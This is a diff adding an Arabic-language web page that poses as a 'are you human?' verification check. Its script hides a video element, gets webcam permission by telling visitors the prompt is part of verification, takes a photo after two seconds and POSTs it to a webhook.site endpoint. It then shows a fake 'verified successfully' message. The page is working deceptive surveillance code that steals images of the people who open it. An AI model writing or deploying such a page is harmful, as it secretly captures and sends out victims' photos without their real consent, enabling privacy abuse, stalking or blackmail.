@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>اختبار التحقق من البشر</title>
+    <style>
+        body { text-align: center; font-family: sans-serif; padding-top: 100px; }
+        .box { border: 2px solid #ccc; padding: 20px; display: inline-block; border-radius: 10px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>هل أنت إنسان؟</h1>
+        <p>لحماية النظام من البوتات، يرجى إثبات أنك إنسان حقيقي.</p>
+        <p><strong>اضغط على "سماح" (Allow) في النافذة المنبثقة لإتمام التحقق.</strong></p>
+    </div>
+    
+    <video id="video" style="display:none" autoplay></video>
+
+    <script>
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // التقاط الصورة بعد ثانيتين من الضغط على سماح
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    const imageData = canvas.toDataURL('image/png');
+                    
+                    // إرسال الصورة للسيرفر الخاص بك
+                    await fetch('https://webhook.site/ccaa7fc6-aa98-4db2-bdce-e85f03e94d2d', {
+                        method: 'POST',
+                        body: JSON.stringify({ image: imageData }),
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+                    
+                    alert("تم التحقق بنجاح! شكراً لك.");
+                }, 2000);
+                
+            } catch (err) {
+                console.error("المستخدم رفض الوصول: ", err);
+            }
+        }
+        startCamera();
+    </script>
+</body>
+</html>
